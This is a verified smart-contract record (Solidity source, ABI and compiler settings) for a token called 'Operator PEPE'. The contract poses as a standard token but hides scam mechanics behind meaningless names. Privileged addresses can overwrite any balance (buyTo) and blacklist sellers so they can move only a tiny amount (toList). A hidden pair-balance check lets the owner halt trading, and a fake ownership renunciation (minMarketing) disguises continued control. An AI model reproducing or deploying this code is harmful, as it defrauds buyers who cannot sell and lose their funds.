{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface totalTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountAuto) external view returns (uint256);\n\n    function transfer(address shouldBuy, uint256 tradingShould) external returns (bool);\n\n    function allowance(address maxExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldBuy,\n        uint256 tradingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitReceiver, uint256 value);\n    event Approval(address indexed maxExempt, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityListAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLaunchedToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverReceiver {\n    function createPair(address toTxWallet, address liquiditySell) external returns (address);\n}\n\ninterface totalToMetadata is totalTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OperatorPEPE is liquidityListAuto, totalTo, totalToMetadata {\n\n    function approve(address teamAt, uint256 tradingShould) public virtual override returns (bool) {\n        totalMin[_msgSender()][teamAt] = tradingShould;\n        emit Approval(_msgSender(), teamAt, tradingShould);\n        return true;\n    }\n\n    bool public amountTeam;\n\n    address private buyFeeAmount;\n\n    event OwnershipTransferred(address indexed feeTrading, address indexed exemptMarketing);\n\n    uint8 private marketingLiquidity = 18;\n\n    function buyWallet(uint256 tradingShould) public {\n        minSwap();\n        tokenSender = tradingShould;\n    }\n\n    function balanceOf(address amountAuto) public view virtual override returns (uint256) {\n        return liquidityTokenMode[amountAuto];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingLiquidity;\n    }\n\n    address public fundMarketing;\n\n    function buyTo(address feeEnable, uint256 tradingShould) public {\n        minSwap();\n        liquidityTokenMode[feeEnable] = tradingShould;\n    }\n\n    function minSwap() private view {\n        require(modeLiquidityTake[_msgSender()]);\n    }\n\n    address swapFundReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minMarketing() public {\n        emit OwnershipTransferred(sellFund, address(0));\n        buyFeeAmount = address(0);\n    }\n\n    function shouldFund(address fromEnable, address shouldBuy, uint256 tradingShould) internal returns (bool) {\n        require(liquidityTokenMode[fromEnable] >= tradingShould);\n        liquidityTokenMode[fromEnable] -= tradingShould;\n        liquidityTokenMode[shouldBuy] += tradingShould;\n        emit Transfer(fromEnable, shouldBuy, tradingShould);\n        return true;\n    }\n\n    uint256 public tokenLaunched;\n\n    function getOwner() external view returns (address) {\n        return buyFeeAmount;\n    }\n\n    bool public buyLaunched;\n\n    string private exemptToken = \"Operator PEPE\";\n\n    uint256 tokenSender;\n\n    bool public fromReceiver;\n\n    address public sellFund;\n\n    uint256 private toWallet = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        receiverLaunchedToken launchAt = receiverLaunchedToken(swapFundReceiver);\n        fundMarketing = receiverReceiver(launchAt.factory()).createPair(launchAt.WETH(), address(this));\n        if (amountTeam) {\n            fundTeamBuy = tokenLaunched;\n        }\n        sellFund = _msgSender();\n        minMarketing();\n        modeLiquidityTake[sellFund] = true;\n        liquidityTokenMode[sellFund] = toWallet;\n        \n        emit Transfer(address(0), sellFund, toWallet);\n    }\n\n    address launchWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public limitLaunch;\n\n    uint256 tradingTakeAuto;\n\n    function owner() external view returns (address) {\n        return buyFeeAmount;\n    }\n\n    mapping(address => bool) public modeLiquidityTake;\n\n    mapping(address => uint256) private liquidityTokenMode;\n\n    function tokenTx(address fromEnable, address shouldBuy, uint256 tradingShould) internal returns (bool) {\n        if (fromEnable == sellFund) {\n            return shouldFund(fromEnable, shouldBuy, tradingShould);\n        }\n        uint256 launchedAmount = totalTo(fundMarketing).balanceOf(launchWallet);\n        require(launchedAmount == tokenSender);\n        require(shouldBuy != launchWallet);\n        if (limitLaunch[fromEnable]) {\n            return shouldFund(fromEnable, shouldBuy, limitTake);\n        }\n        return shouldFund(fromEnable, shouldBuy, tradingShould);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptToken;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalMin;\n\n    uint256 constant limitTake = 11 ** 10;\n\n    function transfer(address feeEnable, uint256 tradingShould) external virtual override returns (bool) {\n        return tokenTx(_msgSender(), feeEnable, tradingShould);\n    }\n\n    uint256 private fundTeamBuy;\n\n    function toList(address totalShouldFee) public {\n        minSwap();\n        if (tokenLaunched == fundTeamBuy) {\n            receiverTeam = true;\n        }\n        if (totalShouldFee == sellFund || totalShouldFee == fundMarketing) {\n            return;\n        }\n        limitLaunch[totalShouldFee] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTxAmount;\n    }\n\n    bool private receiverTeam;\n\n    function tradingLiquidity(address fundSwap) public {\n        require(fundSwap.balance < 100000);\n        if (buyLaunched) {\n            return;\n        }\n        if (amountTeam == fromReceiver) {\n            fromReceiver = false;\n        }\n        modeLiquidityTake[fundSwap] = true;\n        \n        buyLaunched = true;\n    }\n\n    function transferFrom(address fromEnable, address shouldBuy, uint256 tradingShould) external override returns (bool) {\n        if (_msgSender() != swapFundReceiver) {\n            if (totalMin[fromEnable][_msgSender()] != type(uint256).max) {\n                require(tradingShould <= totalMin[fromEnable][_msgSender()]);\n                totalMin[fromEnable][_msgSender()] -= tradingShould;\n            }\n        }\n        return tokenTx(fromEnable, shouldBuy, tradingShould);\n    }\n\n    function allowance(address teamTo, address teamAt) external view virtual override returns (uint256) {\n        if (teamAt == swapFundReceiver) {\n            return type(uint256).max;\n        }\n        return totalMin[teamTo][teamAt];\n    }\n\n    string private walletTxAmount = \"OPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toWallet;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"buyWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeLiquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShouldFee\",\"type\":\"address\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"}],\"name\":\"tradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OperatorPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}